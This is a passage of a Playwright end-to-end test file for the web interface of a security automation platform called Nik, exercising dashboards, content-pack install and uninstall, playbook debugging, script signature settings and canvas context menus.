      .filter({ hasText: 'started mirroring with Acme test' }),
  ).toHaveCount(1)
  await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
  await mirror.getByRole('button', { name: 'Stop' }).click()
  await expect(mirror.getByRole('button', { name: 'Mirror with…' })).toBeVisible()
})

test('a dashboard is built from widgets, shows real numbers, and opens what is behind one', async () => {
  await page.getByRole('button', { name: 'Dashboards', exact: true }).click()
  const boards = page.getByRole('region', { name: 'Dashboards' })
  await expect(page).toHaveURL(/\/dashboards/)
  await boards.getByRole('button', { name: 'New', exact: true }).click()
  const name = boards.getByRole('textbox', { name: 'The name of the dashboard' })
  await expect(name).toHaveValue('New dashboard')
  await name.fill('Shift board')

  // A number: how many incidents there are.
  await boards.getByRole('button', { name: 'Add a widget' }).click()
  await page
    .getByRole('dialog', { name: 'Add a widget' })
    .getByRole('button', { name: /^Number/ })
    .click()
  const editor = page.getByRole('dialog', { name: 'Edit the widget' })
  await editor.getByLabel('Title').fill('Incidents now')
  // The preview asks with the real data of who edits.
  await expect(editor.getByRole('region', { name: 'Preview' })).toContainText(/\d/)
  await editor.getByRole('button', { name: 'Done' }).click()

  // Bars: incidents for each status.
  await boards.getByRole('button', { name: 'Add a widget' }).click()
  await page.getByRole('dialog', { name: 'Add a widget' }).getByRole('button', { name: /^Bars/ }).click()
  await editor.getByLabel('Title').fill('By status')
  await editor.getByLabel('For each').selectOption('status')
  await expect(editor.getByRole('region', { name: 'Preview' })).toContainText('open')
  await editor.getByRole('button', { name: 'Done' }).click()

  // The keyboard moves a widget on the grid: the bars go beside the number, then back under it.
  const grip = boards.getByRole('button', { name: /^Move By status/ })
  await grip.focus()
  await page.keyboard.press('ArrowRight')
  await expect(boards.locator('p[aria-live="polite"]')).toContainText('By status: column 2')
  await page.keyboard.press('ArrowLeft')
  await expect(boards.locator('p[aria-live="polite"]')).toContainText('By status: column 1')

  await boards.getByRole('button', { name: 'Save', exact: true }).click()
  await expect(boards.getByRole('heading', { name: 'Shift board' })).toBeVisible()
  await expect(boards.getByText('Only you')).toBeVisible()
  await expect(page).toHaveURL(/\/dashboards\/[0-9a-f]{32}$/)
  const number = boards.getByRole('article', { name: 'Incidents now' })
  await expect(number.getByRole('button', { name: /^Incidents now: \d+\. Show them\.$/ })).toBeVisible()
  const bars = boards.getByRole('article', { name: 'By status' })
  await expect(bars.getByRole('listitem').first()).toContainText('open')

  // The same figures as a table.
  await bars.getByRole('button', { name: 'Show By status as a table' }).click()
  await expect(bars.getByRole('table')).toContainText('open')
  await bars.getByRole('button', { name: 'Show By status as a chart' }).click()

  // What is behind a number: the query, and the incidents themselves.
  await number.getByRole('button', { name: /Show them/ }).click()
  const behind = page.getByRole('dialog', { name: 'Incidents now' })
  await expect(behind).toContainText(/\d+ objects?/)
  await expect(behind.getByRole('table')).toContainText('WKS-FINANCE-01')
  await behind.getByRole('button', { name: 'Close' }).click()

  await boards.getByRole('button', { name: 'Delete', exact: true }).click()
  await page.getByRole('dialog', { name: 'Delete "Shift board"?' }).getByRole('button', { name: 'Delete' }).click()
  await expect(page.getByRole('navigation', { name: 'Your dashboards' }).getByText('Shift board')).toHaveCount(0)
  await page.getByRole('button', { name: 'Close dashboards' }).first().click()
  await expect(page.getByRole('region', { name: 'Dashboards' })).toHaveCount(0)
})

test('content packs are found, selected, inspected, installed whole, and uninstalled unless in use', async () => {
  // What the catalogue would list (the tests reach no other machine: its answer is given here).
  const entry = (id, name, more) => ({
    id,
    name,
    vendor: 'Atlassian',
    category: '',
    version: '1.0.0',
    description: '',
    requires: [],
    contents: {},
    premium: 0,
    logo: null,
    installed: null,
    update: false,
    needsNik: '',
    ...more,
  })
  const listed = {
    address: 'https://packs.example.test/index.json',
    custom: false,
    ownKey: false,
    fetchedAt: new Date().toISOString(),
    error: '',
    read: true,
    packs: [
      entry('jira-cloud', 'Jira Cloud', {
        category: 'Ticketing',
        tags: ['ticketing', 'atlassian-cloud'],
        connectors: ['Jira Cloud'],
        contents: { connectors: 1, commands: 17, mappers: 1 },
      }),
      entry('confluence-cloud', 'Confluence Cloud', {
        category: 'Code and knowledge',
        tags: ['wiki', 'atlassian-cloud'],
        description: 'Pages made and added to.',
        contents: { connectors: 1, commands: 9 },
      }),
      entry('later-pack', 'Tomorrow', {
        version: '2.0.0',
        tags: ['siem'],
        contents: { playbooks: 2 },
        needsNik: '9.0',
      }),
    ],
  }
  await page.route('**/api/packs/catalogue', (route) => route.fulfill({ json: listed }))
  await page.getByRole('button', { name: 'Platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings
    .getByRole('navigation', { name: 'Settings sections' })
    .getByText('Content packs', { exact: true })
    .click()
  await expect(page).toHaveURL(/\/settings\/automation\/content-packs$/)
  // What Nik ships is one pack, first; the packs of the catalogue are by vendor, each with what it holds.
  const own = settings.getByRole('region', { name: 'Packs of Nik' }).getByRole('listitem', { name: 'Nik built-in' })
  await expect(own).toContainText('installed')
  await expect(own.getByRole('button', { name: /Uninstall/ })).toHaveCount(0)
  const atlassian = settings.getByRole('region', { name: 'Packs of Atlassian' })
  const jira = atlassian.getByRole('listitem', { name: 'Jira Cloud' })
  await expect(jira).toContainText('connector (17 commands) · 1 mapper')
  await expect(jira.getByRole('button', { name: 'Install…' })).toBeVisible()
  const confluence = atlassian.getByRole('listitem', { name: 'Confluence Cloud' })
  const later = atlassian.getByRole('listitem', { name: 'Tomorrow' })
  await expect(later).toContainText('For Nik 9.0 or later.')
  await expect(later.getByRole('button', { name: 'Install…' })).toHaveCount(0)
  await expect(settings.getByRole('group', { name: 'The catalogue' })).toContainText('3 packs')
  // The filters narrow what is shown.
  await settings.getByRole('button', { name: /^Installed \d+$/ }).click()
  await expect(atlassian).toHaveCount(0)
  await settings.getByRole('button', { name: /^All \d+$/ }).click()
  // The search box comes first and looks in everything a card says: the tags and the connectors too.
  const search = settings.getByRole('search', { name: 'Find a pack' }).getByLabel('Search the packs')
  await search.fill('ticketing')
  await expect(jira).toBeVisible()
  await expect(own).toHaveCount(0)
  await search.fill('wiki pages')
  await expect(confluence).toBeVisible()
  await expect(jira).toHaveCount(0)
  await settings.getByRole('button', { name: 'Clear the search' }).click()
  // A tag narrows to the packs that have it, and says how many there are; a second one narrows again.
  await expect(jira).toContainText('ticketing')
  const tags = settings.getByRole('group', { name: 'Tags' })
  await tags.getByRole('button', { name: 'atlassian-cloud 2' }).click()
  await expect(later).toHaveCount(0)
  await expect(own).toHaveCount(0)
  await tags.getByRole('button', { name: 'wiki 1' }).click()
  await expect(confluence).toBeVisible()
  await expect(jira).toHaveCount(0)
  await expect(tags.getByRole('button', { name: /^ticketing/ })).toHaveCount(0)
  await tags.getByRole('button', { name: 'Clear the tags' }).click()
  await expect(jira).toBeVisible()
  // "Hide the installed ones" leaves what there is to install, and is kept in this browser.
  const hide = settings.getByLabel('Hide the installed ones')
  await hide.check()
  await expect(own).toHaveCount(0)
  await expect(jira).toBeVisible()
  expect(await page.evaluate(() => localStorage.getItem('nik.packs.hide-installed'))).toBe('1')
  await settings.getByRole('button', { name: /^Installed \d+$/ }).click()
  await expect(hide).toBeDisabled()
  await expect(own).toBeVisible()
  await settings.getByRole('button', { name: /^All \d+$/ }).click()
  await hide.uncheck()
  await expect(own).toBeVisible()

  // Several at once: two are ticked, and the bar offers what the selection allows.
  await expect(own.getByRole('checkbox')).toHaveCount(0)
  await expect(later.getByRole('checkbox')).toHaveCount(0)
  await jira.getByLabel('Select Jira Cloud').check()
  await confluence.getByLabel('Select Confluence Cloud').check()
  const bar = settings.getByRole('toolbar', { name: 'The packs that are selected' })
  await expect(bar).toContainText('2 selected')
  await expect(bar.getByRole('button', { name: 'Update (0)…' })).toBeDisabled()
  await expect(bar.getByRole('button', { name: 'Uninstall (0)…' })).toBeDisabled()
  // The server says what would happen to each, in the order they would be done (its answer is given
  // here: the tests reach no catalogue). One is left out, with why, and is not counted.
  await page.route('**/api/packs/bulk/plan', (route) =>
    route.fulfill({
      json: {
        action: 'install',
        packs: [
          {
            id: 'confluence-cloud',
            name: 'Confluence Cloud',
            version: '1.0.0',
            installed: null,
            ok: true,
            why: '',
            token: 'a-token-of-the-test',
            counts: { add: 1, update: 0, same: 0, conflict: 0 },
            items: [{ kind: 'connectors', name: 'confluence-cloud', label: 'Connector', action: 'add' }],
          },
          {
            id: 'jira-cloud',
            name: 'Jira Cloud',
            version: '1.0.0',
            installed: null,
            ok: false,
            why: '1 of its items is in conflict: install it on its own to leave them out',
            counts: { add: 1, update: 0, same: 0, conflict: 1 },
            items: [],
          },
        ],
      },
    }),
  )
  await bar.getByRole('button', { name: 'Install (2)…' }).click()
  const several = page.getByRole('dialog', { name: 'Install 2 packs' })
  await expect(several.getByRole('status')).toContainText('1 to install, 1 left out.')
  const lines = several.getByRole('list', { name: 'The packs' })
  await expect(lines.getByRole('listitem', { name: 'Jira Cloud' })).toContainText('left out')
  await expect(lines.getByRole('listitem', { name: 'Jira Cloud' })).toContainText('1 of its items is in conflict')
  const first = lines.getByRole('listitem', { name: 'Confluence Cloud' })
  await expect(first).toContainText('1 to add')
  await first.getByRole('button', { name: 'What Confluence Cloud holds' }).click()
  await expect(first.getByRole('list', { name: 'The items of Confluence Cloud' })).toContainText('confluence-cloud')
  await expect(several.getByRole('button', { name: 'Install (1)' })).toBeEnabled()
  await several.getByRole('button', { name: 'Cancel' }).click()
  await page.unroute('**/api/packs/bulk/plan')
  await settings.getByRole('button', { name: 'Select none' }).click()
  await expect(bar).toHaveCount(0)
  await settings.getByRole('button', { name: 'Select all shown' }).click()
  await expect(bar).toContainText(/\d+ selected/)
  await settings.getByRole('button', { name: 'Select none' }).click()

  // A pack made by hand: a list, and a field that clashes with one Nik has.
  const zipOf = (entries) =>
    page.evaluate(async (files) => {
      // A zip with stored (uncompressed) entries, built here: the browser has no zip writer.
      const encoder = new TextEncoder()
      const table = new Uint32Array(256).map((_, n) => {
        let c = n
        for (let k = 0; k < 8; k += 1) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1
        return c >>> 0
      })
      const crc = (bytes) => {
        let c = 0xffffffff
        for (const byte of bytes) c = table[(c ^ byte) & 0xff] ^ (c >>> 8)
        return (c ^ 0xffffffff) >>> 0
      }
      const parts = []
      const central = []
      let offset = 0
      for (const [name, text] of Object.entries(files)) {
        const nameBytes = encoder.encode(name)
        const data = encoder.encode(text)
        const head = new DataView(new ArrayBuffer(30))
        head.setUint32(0, 0x04034b50, true)
        head.setUint16(4, 20, true)
        head.setUint32(14, crc(data), true)
        head.setUint32(18, data.length, true)
        head.setUint32(22, data.length, true)
        head.setUint16(26, nameBytes.length, true)
        parts.push(new Uint8Array(head.buffer), nameBytes, data)
        const entry = new DataView(new ArrayBuffer(46))
        entry.setUint32(0, 0x02014b50, true)
        entry.setUint16(4, 20, true)
        entry.setUint16(6, 20, true)
        entry.setUint32(16, crc(data), true)
        entry.setUint32(20, data.length, true)
        entry.setUint32(24, data.length, true)
        entry.setUint16(28, nameBytes.length, true)
        entry.setUint32(42, offset, true)
        central.push(new Uint8Array(entry.buffer), nameBytes)
        offset += 30 + nameBytes.length + data.length
      }
      const size = central.reduce((sum, part) => sum + part.length, 0)
      const end = new DataView(new ArrayBuffer(22))
      end.setUint32(0, 0x06054b50, true)
      end.setUint16(8, Object.keys(files).length, true)
      end.setUint16(10, Object.keys(files).length, true)
      end.setUint32(12, size, true)
      end.setUint32(16, offset, true)
      const all = [...parts, ...central, new Uint8Array(end.buffer)]
      const out = new Uint8Array(all.reduce((sum, part) => sum + part.length, 0))
      let at = 0
      for (const part of all) {
        out.set(part, at)
        at += part.length
      }
      return Array.from(out)
    }, entries)
  const zip = await zipOf({
    'pack.yml': 'id: e2e-pack\nname: E2E pack\nversion: 1.0.0\ndescription: Made by the test.\n',
    'lists/e2e_vips.json': JSON.stringify({
      name: 'e2e_vips',
      label: 'E2E VIPs',
      kind: 'values',
      entries: [{ key: 'ceo' }],
    }),
    'fields/severity.json': JSON.stringify({ name: 'severity', label: 'Mine', type: 'text' }),
  })
  const packFile = { name: 'e2e.nikpack', mimeType: 'application/zip', buffer: Buffer.from(zip) }
  await settings.getByLabel('A pack file').setInputFiles(packFile)
  const plan = settings.getByRole('region', { name: 'What importing E2E pack would do' })
  await expect(plan).toContainText('Not installed yet. 1 to add, 1 in conflict.')
  const items = plan.getByRole('list', { name: 'The items of the pack' }).getByRole('listitem')
  await expect(items.filter({ hasText: 'e2e_vips' })).toContainText('add')
  // The field cannot be applied, says why, and starts left out: the rest can go in.
  const clash = items.filter({ hasText: 'severity' })
  await expect(clash).toContainText('conflict')
  await expect(clash).toContainText('Nik has a field of its own with this name')
  await expect(clash.getByRole('checkbox')).not.toBeChecked()
  // Put back, it stops the import.
  await clash.getByRole('checkbox').check()
  await expect(plan.getByRole('button', { name: /^Install/ })).toBeDisabled()
  await expect(plan).toContainText('conflicts: leave it out to go on')
  await clash.getByRole('checkbox').uncheck()
  await plan.getByRole('button', { name: 'Install (1 change)' }).click()
  await expect(settings.getByRole('status')).toContainText(
    'E2E pack 1.0.0 is installed: 1 added, 0 updated, 1 left out.',
  )

  // It is listed with what came from it, and the list is in Lists.
  const row = settings.getByRole('region', { name: 'Packs of Other' }).getByRole('listitem', { name: 'E2E pack' })
  await expect(row).toContainText('1 list')
  await row.getByRole('button', { name: 'Open E2E pack' }).click()
  const details = page.getByRole('dialog', { name: 'E2E pack' })
  await expect(details).toContainText('1.0.0 installed, from a file')
  await expect(details).toContainText('e2e_vips')
  await details.getByRole('button', { name: 'Close', exact: true }).last().click()
  const made = await page.request.get('/api/lists/e2e_vips')
  expect((await made.json()).entries[0].key).toBe('ceo')

  // The same file again has nothing to do.
  await settings.getByLabel('A pack file').setInputFiles(packFile)
  await expect(plan).toContainText('Version 1.0.0 is installed. 1 the same, 1 in conflict.')
  await plan.getByRole('button', { name: 'Cancel' }).click()

  // Making a pack: the list is chosen, the file is offered.
  await settings.getByRole('button', { name: 'Make a pack…' }).click()
  const form = settings.getByRole('region', { name: 'Make a pack' })
  await form.getByLabel('Name', { exact: true }).fill('Our lists')
  await expect(form.getByLabel('Id', { exact: true })).toHaveValue('our-lists')
  await expect(form.getByRole('button', { name: 'Export' })).toBeDisabled()
  await form.getByRole('group', { name: 'Lists' }).getByLabel('E2E VIPs').check()
  const download = page.waitForEvent('download')
  await form.getByRole('button', { name: 'Export' }).click()
  expect((await download).suggestedFilename()).toBe('our-lists-1.0.0.nikpack')

  // Uninstalling says what goes first, then removes what the pack gave.
  await row.getByRole('button', { name: 'Uninstall E2E pack' }).click()
  const uninstall = page.getByRole('dialog', { name: 'Uninstall E2E pack' })
  await expect(uninstall.getByRole('status')).toContainText('1 to remove, 0 to keep.')
  await expect(uninstall.getByRole('list', { name: 'What uninstalling does' })).toContainText('e2e_vips')
  await uninstall.getByRole('button', { name: 'Uninstall', exact: true }).click()
  await expect(settings.getByRole('status').first()).toContainText('E2E pack was uninstalled: 1 removed.')
  await expect(row).toHaveCount(0)
  expect((await page.request.get('/api/lists/e2e_vips')).status()).toBe(404)

  // A pack of which something is in use is not uninstalled. This one gives a connector, and the
  // connector is given an instance.
  const desk = [
    'name: E2E Desk',
    'id: e2e-desk',
    'version: 1',
    'description: Tickets of the test.',
    'configuration:',
    '  - { name: url, type: url, required: true }',
    '  - { name: credentials, type: basic }',
    'base_url: "{{ config.url }}"',
    'test:',
    '  request: { method: GET, path: /me }',
    'commands:',
    '  - name: get-ticket',
    '    arguments: [{ name: number, type: text, required: true }]',
    '    request: { method: GET, path: "/tickets/{{ args.number }}" }',
    '    outputs: { state: "{{ response.state }}" }',
    '',
  ].join('\n')
  const deskZip = await zipOf({
    'pack.yml': 'id: e2e-desk\nname: E2E desk\nversion: 1.0.0\ntags: [ticketing, itsm]\n',
    'connectors/e2e-desk.yml': desk,
  })
  await settings
    .getByLabel('A pack file')
    .setInputFiles({ name: 'desk.nikpack', mimeType: 'application/zip', buffer: Buffer.from(deskZip) })
  await settings
    .getByRole('region', { name: 'What importing E2E desk would do' })
    .getByRole('button', { name: 'Install (1 change)' })
    .click()
  await expect(settings.getByRole('status').first()).toContainText('E2E desk 1.0.0 is installed')
  const instance = await page.request.post('/api/automation/instances', {
    data: {
      name: 'E2E desk one',
      connector: 'e2e-desk',
      config: { url: 'https://desk.example.test/api/' },
      secrets: { username: 'svc', password: 's3cret-pass' },
    },
  })
  expect(instance.status()).toBe(201)
  const deskCard = settings.getByRole('region', { name: 'Packs of Other' }).getByRole('listitem', { name: 'E2E desk' })
  await expect(deskCard).toContainText('itsm')
  await deskCard.getByRole('button', { name: 'Uninstall E2E desk' }).click()
  const heldDialog = page.getByRole('dialog', { name: 'Uninstall E2E desk' })
  await expect(heldDialog.getByRole('status')).toContainText('E2E desk is in use: it cannot be uninstalled yet.')
  const holders = heldDialog.getByRole('list', { name: 'What holds the pack' })
  await expect(holders).toContainText('The instance "E2E desk one" of its connector "e2e-desk" is turned on')
  await expect(holders).toContainText('Delete the instance first')
  await expect(heldDialog.getByRole('button', { name: 'Uninstall', exact: true })).toHaveCount(0)
  await heldDialog.getByRole('button', { name: 'Close', exact: true }).last().click()
  // The server refuses it whoever asks, and says what holds it.
  const refusal = await page.request.delete('/api/packs/e2e-desk?remove=true')
  expect(refusal.status()).toBe(409)
  expect((await refusal.json()).detail.held).toHaveLength(1)
  // With others it is the one that is left, with why.
  await deskCard.getByLabel('Select E2E desk').check()
  const chosen = settings.getByRole('toolbar', { name: 'The packs that are selected' })
  await chosen.getByRole('button', { name: 'Uninstall (1)…' }).click()
  const leaving = page.getByRole('dialog', { name: 'Uninstall 1 pack' })
  await expect(leaving.getByRole('status')).toContainText('0 to uninstall, 1 left out.')
  await expect(leaving.getByRole('list', { name: 'What holds E2E desk' })).toContainText('E2E desk one')
  await expect(leaving.getByRole('button', { name: 'Uninstall (0)' })).toBeDisabled()
  await leaving.getByRole('button', { name: 'Cancel' }).click()
  // Once the instance is deleted nothing holds it: it is uninstalled.
  const instanceId = (await instance.json()).id
  expect((await page.request.delete(`/api/automation/instances/${instanceId}`)).status()).toBe(204)
  await chosen.getByRole('button', { name: 'Uninstall (1)…' }).click()
  await expect(leaving.getByRole('status')).toContainText('1 to uninstall, 0 left out.')
  await leaving.getByRole('button', { name: 'Uninstall (1)' }).click()
  await expect(leaving.getByRole('status')).toContainText('1 uninstalled, 0 not.')
  await expect(leaving.getByRole('listitem', { name: 'E2E desk' })).toContainText('uninstalled: 1 removed')
  await leaving.getByRole('button', { name: 'Close', exact: true }).last().click()
  await expect(settings.getByRole('status').first()).toContainText('1 pack uninstalled.')
  await expect(deskCard).toHaveCount(0)
  await expect(chosen).toHaveCount(0)
  const still = (await (await page.request.get('/api/packs')).json()).packs
  expect(still.some((pack) => pack.id === 'e2e-desk')).toBe(false)
  await page.unroute('**/api/packs/catalogue')
  await page.getByRole('button', { name: 'Close settings' }).click()
})

test('a draft is debugged: the run stops before a node, takes what is typed, and skips the next', async () => {
  // A playbook that is only a draft (made through the API: the canvas has its own test).
  const made = await page.request.post('/api/automation/playbooks', { data: { name: 'Debug me' } })
  expect(made.status()).toBe(201)
  const playbookId = (await made.json()).id
  const note = (id, name, y, text) => ({
    id,
    kind: 'action',
    name,
    position: { x: 40, y },
    config: { action: 'nik.add-note', args: { text } },
  })
  const draft = {
    nodes: [
      { id: 'start', kind: 'trigger', name: 'Trigger', position: { x: 40, y: 40 }, config: { manual: true } },
      note('first', 'First note', 160, 'written by the playbook'),
      note('second', 'Second note', 280, 'never written'),
    ],
    edges: [
      { from: 'start', to: 'first' },
      { from: 'first', to: 'second' },
    ],
  }
  const saved = await page.request.put(`/api/automation/playbooks/${playbookId}`, { data: { draft } })
  expect(saved.status()).toBe(200)

  await page.getByRole('button', { name: 'Automations', exact: true }).click()
  const area = page.getByRole('region', { name: 'Automations' })
  await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Playbooks' }).click()
  await area.getByRole('row').filter({ hasText: 'Debug me' }).getByRole('button', { name: 'Debug me' }).click()
  await expect(area.getByRole('heading', { name: 'Debug me' })).toBeVisible()
  await area.getByRole('button', { name: 'Debug…' }).click()
  const ask = page.getByRole('dialog', { name: 'Debug "Debug me"' })
  // There is no saved version: the draft is what runs.
  await expect(ask.getByLabel(/^The draft, as it is drawn now/)).toBeChecked()
  await ask.getByRole('combobox').selectOption({ index: 1 })
  await ask.getByRole('button', { name: 'Start debugging' }).click()

  await expect(page).toHaveURL(/\/automation\/runs\/[0-9a-f]+$/)
  const debug = area.getByRole('region', { name: 'Debugger' })
  await expect(debug.getByRole('status')).toContainText('Stopped before First note.', { timeout: 20_000 })
  await expect(debug.getByRole('status')).toContainText('It runs the draft')
  await expect(area.getByRole('status', { name: 'Status of the run' })).toHaveText('stopped at a node')
  // What the node will be given, changed for this once.
  const given = debug.getByLabel(/^What First note will be given/)
  await expect(given).toHaveValue(/written by the playbook/)
  await given.fill('{ "text": "typed while debugging" }')
  await debug.getByRole('button', { name: 'Step', exact: true }).click()
  await expect(debug.getByRole('status')).toContainText('Stopped before Second note.', { timeout: 20_000 })

  // The first node ran with what was typed, and sent nothing for real: it shows what it would have done.
  const steps = area.getByRole('complementary', { name: 'Steps of the run' })
  await steps.getByRole('button', { name: /First note/ }).click()
  await expect(steps).toContainText('typed while debugging')
  // A breakpoint on the node that is selected, and off again.
  await steps.getByLabel('Stop before this node').check()
  await expect(steps.getByLabel('Stop before this node')).toBeChecked()
  await steps.getByLabel('Stop before this node').uncheck()
  await expect(steps.getByLabel('Stop before this node')).not.toBeChecked()

  await debug.getByRole('button', { name: 'Skip', exact: true }).click()
  await expect(debug.getByRole('status')).toContainText('The debug run is over.', { timeout: 20_000 })
  await expect(steps.getByRole('button', { name: /Second note/ })).toContainText('skipped')

  // Debug runs are listed apart, and are not the runs of the playbook.
  await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Runs' }).click()
  await expect(area.getByRole('row').filter({ hasText: 'Debug me' })).toHaveCount(0)
  await area.getByLabel('Debug runs').check()
  await expect(area.getByRole('row').filter({ hasText: 'Debug me' })).toHaveCount(1)
  const notes = await (await page.request.get('/api/automation/runs?debug=true')).json()
  expect(notes.runs[0].debug).toBe(true)
  await area.getByRole('button', { name: 'Close automations' }).click()
})

test('script signatures: one Nik ships is turned off and put back, one of your own is added and deleted', async () => {
  await page.getByRole('button', { name: 'Platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings
    .getByRole('navigation', { name: 'Settings sections' })
    .getByRole('button', { name: 'Script signatures' })
    .click()
  await expect(page).toHaveURL(/\/settings\/rules\/script-signatures$/)
  const table = settings.getByRole('table', { name: 'Script signatures' })
  // What Nik ships is there, on.
  const off = table.getByRole('button', { name: /^Turn .+ off$/ }).first()
  const key = (await off.getAttribute('aria-label')).replace(/^Turn (.+) off$/, '$1')
  await off.click()
  await expect(table.getByRole('button', { name: `Turn ${key} on` })).toBeVisible()
  // Off is not a change of the signature: nothing to put back, and it is never deleted.
  await expect(table.getByRole('button', { name: `Delete ${key}` })).toHaveCount(0)
  await expect(table.getByRole('button', { name: `Restore ${key}` })).toHaveCount(0)
  await table.getByRole('button', { name: `Turn ${key} on` }).click()
  await expect(table.getByRole('button', { name: `Turn ${key} off` })).toBeVisible()
  // Changed, it says by whom and can be put back as it shipped.
  await table.getByRole('button', { name: `Edit ${key}` }).click()
  const form = settings.getByRole('form', { name: `Signature ${key}` })
  await form.getByRole('spinbutton').fill('7')
  await form.getByRole('button', { name: 'Save' }).click()
  await expect(table.getByRole('row', { name: new RegExp(key.replace('.', '\\.')) })).toContainText('changed by')
  await table.getByRole('button', { name: `Restore ${key}` }).click()
  await expect(table.getByRole('button', { name: `Restore ${key}` })).toHaveCount(0)

  // One of your own, through the API the page uses; a pattern that cannot be compiled is refused.
  const refused = await page.request.post('/api/script-signatures', {
    data: { key: 'e2e.broken', title: 'Broken', severity: 'low', points: 1, pattern: '(' },
  })
  expect(refused.status()).toBe(400)
  const made = await page.request.post('/api/script-signatures', {
    data: { key: 'e2e.gate', title: 'A gate of ours', severity: 'low', points: 1, pattern: 'e2eGate\\(' },
  })
  expect(made.status()).toBe(201)
  // Leaving the section and coming back reads the rows again.
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  await sections.getByRole('button', { name: 'YARA rules' }).click()
  await sections.getByRole('button', { name: 'Script signatures' }).click()
  await expect(table.getByRole('row', { name: /e2e\.gate/ })).toContainText('A gate of ours')
  await table.getByRole('button', { name: 'Delete e2e.gate' }).click()
  await expect(table.getByRole('row', { name: /e2e\.gate/ })).toHaveCount(0)
  await page.getByRole('button', { name: 'Close settings' }).click()
  await expect(settings).toHaveCount(0)
})

test('right-click on a playbook, a script and a dashboard offers what they do and their link', async () => {
  await page.getByRole('button', { name: 'Automations' }).click()
  const area = page.getByRole('region', { name: 'Automations' })
  const playbooks = area.getByRole('table').first()
  const row = playbooks.getByRole('row').nth(1)
  const name = (await row.getByRole('button').first().textContent()).trim()
  await row.click({ button: 'right' })
  const menu = page.getByRole('menu')
  await expect(menu).toContainText(name)
  await expect(menu.getByRole('menuitem')).toHaveText([
    'Open',
    'Its runs',
    'Run…',
    'Copy link',
    'Copy the name',
    'Delete…',
    // What the page makes, then what every page has.
    'New playbook…',
    ...GENERAL_MENU,
  ])
  // Open does what a click on the name does.
  await menu.getByRole('menuitem', { name: 'Open', exact: true }).click()
  await expect(page).toHaveURL(/\/automation\/playbooks\/[^/]+/)
  await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Scripts' }).click()
  await area.getByRole('table').first().getByRole('row').nth(1).click({ button: 'right' })
  await expect(page.getByRole('menu').getByRole('menuitem')).toHaveText([
    'Open',
    'Copy link',
    'Copy the name',
    'Delete…',
    'New script…',
    ...GENERAL_MENU,
  ])
  await page.keyboard.press('Escape')
  await expect(page.getByRole('menu')).toHaveCount(0)
  await area.getByRole('button', { name: 'Close automations' }).click()

  await page.getByRole('button', { name: 'Dashboards', exact: true }).click()
  const boards = page.getByRole('navigation', { name: 'Your dashboards' })
  await boards.getByRole('listitem').first().click({ button: 'right' })
  await expect(page.getByRole('menu').getByRole('menuitem')).toHaveText([
    'Open',
    'Copy link',
    'Copy the name',
    ...GENERAL_MENU,
  ])
  await page.keyboard.press('Escape')
  await page.getByRole('button', { name: 'Close dashboards' }).first().click()
})

test('a connection of the canvas shows an × that removes it, and nothing else', async () => {
  await page.getByRole('button', { name: 'Automations', exact: true }).click()
  const area = page.getByRole('region', { name: 'Automations' })
  await area.getByRole('button', { name: 'Note on high' }).click()
  const edges = area.locator('.react-flow__edge')
  // The pointer on the middle of a line: an SVG path of no width is not something to hover by itself.
  const over = async (edge) => {
    const middle = await edge.locator('.react-flow__edge-interaction').evaluate((path) => {
      const box = path.getBoundingClientRect()
      return { x: box.x + box.width / 2, y: box.y + box.height / 2 }
    })
    await page.mouse.move(middle.x, middle.y)
  }
  await expect(edges.first()).toBeAttached()
  const before = await edges.count()
  // Nothing is shown until the pointer is on the line.
  await expect(area.getByRole('button', { name: /^Remove the connection/ })).toHaveCount(0)
  await over(edges.first())
  const remove = area.getByRole('button', { name: /^Remove the connection/ })
  await expect(remove).toBeVisible()
  // The × is all a line has: nothing on it makes or moves a corner, the canvas routes it.
  await expect(area.getByTestId('playbook-canvas').getByRole('button', { name: /corner/i })).toHaveCount(0)
  await expect(area.locator('.react-flow__edgelabel-renderer').getByRole('button')).toHaveCount(1)
  await remove.click()
  await expect(edges).toHaveCount(before - 1)
  // The playbook is left as it was.
  await area.getByRole('button', { name: 'Undo' }).click()
  await expect(edges).toHaveCount(before)
  await area.getByRole('button', { name: 'Close automations' }).click()
})

test('right-click in the playbook editor: a node is duplicated and deleted, one is added where the click was, a line is deleted', async () => {
  // A playbook that is only a draft (made through the API: drawing one has its own test).
  const made = await page.request.post('/api/automation/playbooks', { data: { name: 'Menu on the canvas' } })
  expect(made.status()).toBe(201)
  const playbookId = (await made.json()).id
  const draft = {
    nodes: [
      { id: 'start', kind: 'trigger', name: 'Trigger', position: { x: 40, y: 40 }, config: { manual: true } },
      {
        id: 'note',
        kind: 'action',
        name: 'Write it down',
        position: { x: 40, y: 160 },
        config: { action: 'nik.add-note', args: { text: 'seen' } },
      },
    ],
    // A line that was given a corner by an earlier release: it loads, and is drawn by the canvas.
    edges: [{ from: 'start', to: 'note', points: [{ x: 300, y: 100 }] }],
  }
  expect((await page.request.put(`/api/automation/playbooks/${playbookId}`, { data: { draft } })).status()).toBe(200)

  await page.getByRole('button', { name: 'Automations', exact: true }).click()
  const area = page.getByRole('region', { name: 'Automations' })
  await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Playbooks' }).click()
  await area
    .getByRole('row')
    .filter({ hasText: 'Menu on the canvas' })
    .getByRole('button', { name: 'Menu on the canvas' })
    .click()
  const canvas = area.getByTestId('playbook-canvas')
  const nodes = canvas.locator('.react-flow__node')
  const edges = canvas.locator('.react-flow__edge')
  const menu = page.getByRole('menu')
  await expect(nodes).toHaveCount(2)
  await expect(edges).toHaveCount(1)

  // On a node: what is done to a node, each with the key that does the same.
  await nodes.filter({ hasText: 'Write it down' }).click({ button: 'right' })
  await expect(menu).toContainText('Write it down')
  await expect(menu.getByRole('menuitem')).toHaveText([
    'Open in the inspectorenter',
    'Debug, stopping before it…',
    'Duplicatectrl d',
    'Copyctrl c',
    'Cutctrl x',
    'Disconnect its lines',
    'Deletedel',
    ...GENERAL_MENU,
  ])
  await menu.getByRole('menuitem', { name: 'Duplicate' }).click()
  await expect(nodes).toHaveCount(3)
  // The copy is what is selected: its menu deletes it.
  const copy = nodes.filter({ hasText: 'Write it down' }).last()
